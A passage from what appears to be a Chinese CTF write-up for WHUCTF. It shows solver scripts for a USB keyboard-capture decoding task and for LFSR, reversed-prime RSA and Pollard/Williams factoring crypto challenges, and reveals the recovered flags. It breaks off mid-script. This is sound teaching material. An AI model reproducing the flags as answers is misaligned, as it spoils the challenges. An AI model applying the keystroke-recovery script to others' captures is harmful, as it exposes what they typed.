class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,<br>            <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,<br>            <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;!&quot;</span>,<br>            <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>,<br>            <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,<br>            <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>,<br>            <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>            <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">17</span>:<br>        <span class="hljs-keyword">continue</span><br>    nums.append(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>])<br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> normalKeys:<br>        <span class="hljs-keyword">if</span> n[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            output += shiftKeys[n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            output += normalKeys[n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output :&#x27;</span> + output.replace(<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))<br></code></pre></td></tr></table></figure><p>输出为<code>output :ijniokj tfcfg fgtrdcv iuhbghj jkiuhnm ygvgh_ijnjkmn uhbn tgbnjujm ghytfvb_fghygvb ygbnju &lt;DEL&gt;_eszsd dfresxc hgvbhuhb_uyhbv dcfvg hbu hjkijnm uygbn eszsdx</code></p><p>低头看看键盘，就会发现每一组字母都是在键盘上拼出一个一个字母的形状。</p><p>最后得到<code>prefer_blue_to_red_switch</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="LFSR-Signin"><a href="#LFSR-Signin" class="headerlink" title="LFSR_Signin"></a>LFSR_Signin</h3><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br><br>flag = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">255</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    flag[i] = <span class="hljs-built_in">int</span>(flag[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2025</span>):<br>    flag.append(flag[i] ^ flag[i+<span class="hljs-number">20</span>] ^ flag[i+<span class="hljs-number">25</span>] ^ flag[i+<span class="hljs-number">250</span>] ^ flag[-<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(flag[-<span class="hljs-number">1</span>], end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-commentspan><br></code></pre></td></tr></table></figure><p><strong>分析：</strong> 通过代码可以发现，生成时，每个最后边生成的二进制数字都是由前边的一些数字异或得到，逆向来分析，同理，每个靠前的数字也都可以由后边的一些数字得到。<br>由此，我们便可以从第255位开始，反向一个一个求出前255个数字。</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>enc=<span class="hljs-string">&quot;110000011011110000010101100011111101011011111111111111101011000111001010111000101111101100011011000110011000100010011111110111010110000111111111111101111011011101000000010011110010111000110100110011101110101010110001110100111001100011100001001000000011010011001101001000000000110110100101000110000011011100011100001000010001110000111110000110010001110001101011101110100011010000101101000000000001101111111001010100011110110001101010010100011010011010010110010110100011001100010010010110110010010001111010111100011101100001111111110101011010011111110101000110010000101011011101000000111000001011010010001010101101111111001100010001001011100100111000010100011001001111011110111111101100111001011100001110110110100010011010011111110010111001101000011000011111001101100111001111000010011110011111001010001111110001010100100011001000100011001010010111010000011101011001111111010010010101001010011010000010000100001010111000000000010011011110110001101010010101001010100100010110001001000101000001011111010110101110111100101001100101011000010000101010001010111010111010010110001111010000001101101100101111001010010010011010101110001101001111011010001000010111010011010001011011011000111101010001101110000100100011010011111110110000001101100010011000110100010101010010101100101011001001100010100111011101111100010111100010001101100101100111110101001111101000010110110011000111100110101001111001100110111100111111000101101101000011110011001101100111100111001001001001100101111101110111011111110110101000001100010110101101100100001110100110101100101011010101101101100011011000001111001010001110000110001001011001001110111110000001000011000011000101010101010010010100010011011000011100111011101111110100101111111001011010110010010011101011001011110001101110110110111110100000100001111100101000001101010000011001001100100010101111010100000010110010010111000000010010101001011001011001111001000100010100101000011110110101001011111011111001010111101111000001101101100101111010101100110000111011101100100000011001110011000110110100101010100&quot;</span><br>c=[<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2280</span>)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2025</span>):<br>    c[i+<span class="hljs-number">255</span>] = <span class="hljs-built_in">int</span>(enc[i])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">254</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    a=c[i+<span class="hljs-number">255</span>]^c[i+<span class="hljs-number">254</span>]^c[i+<span class="hljs-number">250</span>]^c[i+<span class="hljs-number">20</span>]^c[i+<span class="hljs-number">25</span>]<br>    <span class="hljs-string">&quot;&quot;&quot; if a == c[i]:</span><br><span class="hljs-string">        print(1) &quot;&quot;&quot;</span><br>    c[i]=a<br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>    res+=<span class="hljs-built_in">str</span>(c[i])<br><span class="hljs-built_in">print</span>(res)<br>m=long_to_bytes(<span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-comment">#print(c)</span><br></code></pre></td></tr></table></figure><p>得到flag<code>whuctf&#123;quit3_ea5y_Sign1n_R1ght?&#125;</code></p><h3 id="RSAASR"><a href="#RSAASR" class="headerlink" title="RSAASR"></a>RSAASR</h3><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, isPrime, bytes_to_long, long_to_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">bit</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = getPrime(bit)<br>        q = rev(p)<br>        <span class="hljs-keyword">if</span> isPrime(q):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> p, q<br><br><br>rev = <span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(<span class="hljs-built_in">bin</span>(x)[:<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">2</span>)   <span class="hljs-comment"># 二进制反转整数</span><br>flag = <span class="hljs-string">b&quot;??????&quot;</span><br>p, q = generate(<span class="hljs-number">512</span>)                    <span class="hljs-comment">#p,q相互反转</span><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n=<span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e=<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c=<span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n=89260288112458610375700543707493254232809306221431627423709616690294586688526862549905410606087786699242563057156677052913617284849136716660502920085006747882186134482309361626185003661858419446057779826705477210404882478906671799290032009310469036065257789664458482249297907582602310789531951177426393110643</span><br><span class="hljs-string">e=65537</span><br><span class="hljs-string">c=34953739673730018843655174314108340461262205663805875643136393046216892771730195951086950749299233260612871271352091804579992550715616098448464010205976283620661044089962336249776561849400241337436006809354102892524119722533361144592982143227173415365371111087024439252557012289555411199194971295453523635612</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong> 剪枝题，直接打板子，具体可参考<a href="https://tangcuxiaojikuai.xyz/post/342113ee.html">Crypto趣题-剪枝 | 糖醋小鸡块的blog</a><br><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">89260288112458610375700543707493254232809306221431627423709616690294586688526862549905410606087786699242563057156677052913617284849136716660502920085006747882186134482309361626185003661858419446057779826705477210404882478906671799290032009310469036065257789664458482249297907582602310789531951177426393110643</span><br>c = <span class="hljs-number">34953739673730018843655174314108340461262205663805875643136393046216892771730195951086950749299233260612871271352091804579992550715616098448464010205976283620661044089962336249776561849400241337436006809354102892524119722533361144592982143227173415365371111087024439252557012289555411199194971295453523635612</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">ph,qh,pl,ql</span>):<br>    l = <span class="hljs-built_in">len</span>(ph)<br>    tmp0 = ph + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;0&quot;</span> + pl<br>    tmp1 = ph + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;1&quot;</span> + pl<br>    tmq0 = qh + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;0&quot;</span> + ql<br>    tmq1 = qh + (<span class="hljs-number">512</span>-<span class="hljs-number">2</span>*l)*<span class="hljs-string">&quot;1&quot;</span> + ql<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(tmp0,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(tmq0,<span class="hljs-number">2</span>) &gt; n):<br>        <span class="hljs-keyword">return</span> <br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(tmp1,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(tmq1,<span class="hljs-number">2</span>) &lt; n):<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(pl,<span class="hljs-number">2</span>)*<span class="hljs-built_in">int</span>(ql,<span class="hljs-number">2</span>) % (<span class="hljs-number">2</span>**(l-<span class="hljs-number">1</span>)) != n % (<span class="hljs-number">2</span>**(l-<span class="hljs-number">1</span>))):<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">if</span>(l == <span class="hljs-number">256</span>):<br>        pp0 = <span class="hljs-built_in">int</span>(tmp0,<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span>(n % pp0 == <span class="hljs-number">0</span>):<br>            pf = pp0<br>            qf = n//pp0<br>            phi = (pf-<span class="hljs-number">1</span>)*(qf-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            m1 = <span class="hljs-built_in">pow</span>(c,d,n)<br>            <span class="hljs-built_in">print</span>(long_to_bytes(m1))<br>            exit()<br><br>    <span class="hljs-keyword">else</span>:<br>        find(ph+<span class="hljs-string">&quot;1&quot;</span>,qh+<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>+pl,<span class="hljs-string">&quot;1&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;0&quot;</span>,qh+<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>+pl,<span class="hljs-string">&quot;0&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;1&quot;</span>,qh+<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>+pl,<span class="hljs-string">&quot;1&quot;</span>+ql)<br>        find(ph+<span class="hljs-string">&quot;0&quot;</span>,qh+<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>+pl,<span class="hljs-string">&quot;0&quot;</span>+ql)<br><br>find(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="Pollard-Williams"><a href="#Pollard-Williams" class="headerlink" title="Pollard &amp; Williams"></a>Pollard &amp; Williams</h3><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>flag = <span class="hljs-string">b&#x27;whuctf&#123;&#125;&#x27;</span><br>blen = <span class="hljs-number">256</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa</span>(<span class="hljs-params">p, q, message</span>):<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br><br>    pad_length = n.bit_length() // <span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(message) - <span class="hljs-number">2</span><br>    message += os.urandom(pad_length)<br>    m = bytes_to_long(message)<br>    <span class="hljs-keyword">return</span> n, <span class="hljs-built_in">pow</span>(m, e, n)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part1</span>(<span class="hljs-params">message1, message2</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p1 = getPrime(blen)         <span class="hljs-comment">#256bit</span><br>        p2 = (p1 - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> isPrime(p2):<br>            <span class="hljs-keyword">break</span><br><br>    q1 = getPrime(blen)<br>    q2 = getPrime(blen)<br><br>    <span class="hljs-keyword">return</span> rsa(p1, q1, message1), rsa(p2, q2, message2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">part2</span>(<span class="hljs-params">message1, message2</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p1 = getPrime(blen)<br>        p2 = (p1 + <span class="hljs-number">1</span>) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> isPrime(p2):<br>            <span class="hljs-keyword">break</span><br><br>    q1 = getPrime(blen)<br>    q2 = getPrime(blen)<br><br>    <span class="hljs-keyword">return</span> rsa(p1, q1, message1), rsa(p2, q2, message2)<br><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">44</span>              <span class="hljs-comment">#长度为44</span><br>l = <span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>                  <span class="hljs-comment">#11</span><br>m1, m2, m3, m4 = [flag[i * l: i * l + l] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)] <span class="hljs-comment">#分成四份</span><br>c1, c2 = part1(m1, m2)<br>c3, c4 = part2(m3, m4)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c1 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c2 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c3 = &#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;c4 = &#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># c1 = (6053032598894343876848386724367478876865502990878797490385487692233771017587839889683279773931697102081210221515871925626229356354906807395177342943323369, 4066195854081844630643812355140109730178549671457699640787009592379117222130777528564788537029636082768525403919530491221982157867347461546035515101540809)</span><br><span class="hljs-comment"># c2 = (3881600892538209342174115382004433032693183438455968854185245139152150453077746028435728337685187304179257593974737056409431270271087770400534952463611803, 3170419555737452151768856928448822332346045957475336562622244748908867061340721719260259808765271614258250388620180512676045609008728482012225062330421389)</span><br><span class="hljs-comment"># c3 = (12299016617136978588548772285625358530978334196485520160172325214608426825374255755330322407319092229940503630270734074076341447314630647646764214262929507, 318163940794629731124968470499655451861010987042419720693423620230895540439020747998494269609254222775880714679954773027280497632868550785421041286883861)</span><br><span class="hljs-comment"># c4 = (4549315768074822845197072475333248869579555413221208949230121240611191001190288208256119819724334902434536556333152862828649067092565476816480268615884657, 1882968780168858989700488482275734089425710600149658668167954773629584030303631176914870357507995175067079535271674721507969999430710585448040194277936142)</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong> 可以看出，flag被分成了四部分，而且前两个之间存在关系，后两个之间存在关系。</p><p>重点在于<code>p2 = (p1 - 1) // 2</code>,<code>p2 = (p1 + 1) // 2</code>，我们来逐个分析。</p><p><strong>Part1：</strong></p><span>$$\because p_2=(p_1-1)//2 \\\therefore 2*N_2=2*p_2*q_2=(p_1-1)q_2 \\即 p_1-1|2*N2 \\ \therefore a^{2*N_2} \equiv a^{q_2*(p1-1)}\equiv1 \mod p_1 \\\therefore a^{2*N_2}-1 = kp_1 \\当然 a^{2*N_2}-1 \mod N_1 = kp_1 \\\therefore p_1=gcd(a^{2*N2}-1 \mod N_1,N_1)$$</span><p>之后$q_1,p_2,q_2$便都能求出来，之后就是简单的RSA</p><p><strong>Part2:</strong></p><p>对于william p+1光滑算法中，p+1为光滑数，设B为p+1最大的光滑因子，要求得下标为B的阶乘B!卢卡斯序列，目的就是保证(p+1)|B!，而本题中能够看出$2*N_4&#x3D;(p_3+1)*q_4$必然是$(p_3+1)$的整数倍。</p><p>之后就利用卢卡斯序列的性质来求$p_3。即p_3|(V_{2*N_4}-2)$</p><p>$\therefore p_3|gcd(V_{2*N_4}-2,N_3)$</p><p>$\therefore p_3&#x3D;gcd(V_{2*N_4}-2\mod N_3,N_3)$</p><p>之后同上，脚本如下</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 